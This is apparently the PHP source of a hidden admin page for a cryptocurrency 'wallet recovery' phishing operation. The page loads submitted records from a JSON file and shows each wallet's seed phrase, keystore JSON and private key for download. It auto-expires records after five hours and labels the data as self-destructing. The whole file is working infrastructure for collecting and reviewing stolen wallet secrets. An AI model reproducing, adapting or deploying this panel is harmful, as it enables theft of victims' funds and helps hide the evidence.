<?php
$dataFile = __DIR__ . '/api/recovery-data.json';
if (file_exists($dataFile)) {
    $requests = json_decode(file_get_contents($dataFile), true) ?: [];
} else {
    $requests = [];
}

// Filter out expired
$currentTime = date('Y-m-d H:i:s');
$requests = array_filter($requests, function($r) use ($currentTime) {
    return $r['expires_at'] > $currentTime;
});

// Update the file
file_put_contents($dataFile, json_encode(array_values($requests), JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hidden Admin | Recovery Vault</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>body { font-family: 'Inter', sans-serif; background: #020617; }</style>
</head>
<body class="min-h-screen text-slate-100">
    <div class="max-w-7xl mx-auto py-10 px-4">
        <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-6 mb-8">
            <div>
                <p class="text-xs uppercase tracking-[0.35em] text-slate-500">Recovery Vault</p>
                <h1 class="text-4xl font-bold">Hidden Admin Portal</h1>
                <p class="mt-3 text-slate-400 max-w-2xl">This page displays submitted phrases, keystore JSON, and private keys for admin review only.</p>
            </div>
            <button onclick="location.reload()" class="px-5 py-3 bg-red-600 hover:bg-red-700 rounded-2xl font-semibold text-white">Refresh</button>
        </div>

        <div id="summary" class="grid gap-4 md:grid-cols-3 mb-8">
            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6">
                <p class="text-sm uppercase text-slate-500">Total submissions</p>
                <p class="text-3xl font-bold mt-4"><?php echo count($requests); ?></p>
            </div>
            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6">
                <p class="text-sm uppercase text-slate-500">Pending reviews</p>
                <p class="text-3xl font-bold mt-4"><?php echo count(array_filter($requests, fn($r) => !isset($r['reviewed']) || !$r['reviewed'])); ?></p>
            </div>
            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6">
                <p class="text-sm uppercase text-slate-500">Last synced</p>
                <p class="text-3xl font-bold mt-4"><?php echo date('H:i:s'); ?></p>
            </div>
        </div>

        <div class="bg-slate-900 border border-slate-800 rounded-3xl overflow-hidden">
            <div class="p-6 border-b border-slate-800 flex items-center justify-between">
                <div>
                    <h2 class="text-xl font-bold">Recovery Submissions</h2>
                    <p class="text-sm text-slate-500">Review all hidden phrase and key submissions.</p>
                </div>
                <button onclick="refreshRequests()" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-2xl text-sm font-semibold">Refresh</button>
            </div>
            <div class="p-6 space-y-4">
                <?php if (empty($requests)): ?>
                    <p class="text-slate-500">No recovery submissions have been received yet.</p>
                <?php else: ?>
                    <?php foreach ($requests as $r): ?>
                        <div class="bg-slate-950 border border-slate-800 rounded-3xl p-5">
                            <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-3">
                                <div>
                                    <p class="text-xs uppercase tracking-[0.2em] text-slate-500">Request #<?php echo htmlspecialchars($r['id']); ?></p>
                                    <h3 class="text-lg font-bold mt-2"><?php echo htmlspecialchars($r['wallet_name']); ?></h3>
                                    <p class="text-sm text-slate-400 mt-1">Type: <?php echo htmlspecialchars($r['recovery_type']); ?> · Status: <?php echo isset($r['reviewed']) && $r['reviewed'] ? 'reviewed' : 'pending'; ?></p>
                                </div>
                                <div class="text-right text-slate-500 text-xs">
                                    <div><?php echo date('M j, Y H:i', strtotime($r['created_at'])); ?></div>
                                    <div class="mt-1">Expires: <?php echo date('M j, Y H:i', strtotime($r['expires_at'])); ?></div>
                                </div>
                            </div>
                            <?php if (!empty($r['phrase'])): ?>
                                <div class="mt-4">
                                    <p class="text-xs uppercase tracking-[0.2em] text-slate-500">Phrase</p>
                                    <textarea readonly class="mt-2 w-full bg-slate-900 border border-slate-800 rounded-3xl p-4 text-slate-300 text-sm font-mono resize-none" rows="4"><?php echo htmlspecialchars($r['phrase']); ?></textarea>
                                </div>
                            <?php endif; ?>
                            <?php if (!empty($r['keystore'])): ?>
                                <div class="mt-4">
                                    <p class="text-xs uppercase tracking-[0.2em] text-slate-500">Keystore JSON</p>
                                    <textarea readonly class="mt-2 w-full bg-slate-900 border border-slate-800 rounded-3xl p-4 text-slate-300 text-sm font-mono resize-none" rows="4"><?php echo htmlspecialchars($r['keystore']); ?></textarea>
                                </div>
                            <?php endif; ?>
                            <?php if (!empty($r['private_key'])): ?>
                                <div class="mt-4">
                                    <p class="text-xs uppercase tracking-[0.2em] text-slate-500">Private Key</p>
                                    <textarea readonly class="mt-2 w-full bg-slate-900 border border-slate-800 rounded-3xl p-4 text-slate-300 text-sm font-mono resize-none" rows="4"><?php echo htmlspecialchars($r['private_key']); ?></textarea>
                                </div>
                            <?php endif; ?>
                            <?php if (empty($r['phrase']) && empty($r['keystore']) && empty($r['private_key'])): ?>
                                <textarea readonly class="mt-4 w-full bg-slate-900 border border-slate-800 rounded-3xl p-4 text-slate-300 text-sm font-mono resize-none" rows="6"><?php echo htmlspecialchars($r['recovery_data']); ?></textarea>
                            <?php endif; ?>
                            <div class="mt-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
                                <span class="text-xs text-slate-500">This data self-destructs 5 hours after submission.</span>
                                <a href="api/recovery-download.php?id=<?php echo urlencode($r['id']); ?>" class="inline-flex items-center justify-center px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-2xl text-sm font-semibold">Download file</a>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
    </div>
</body>
</html>
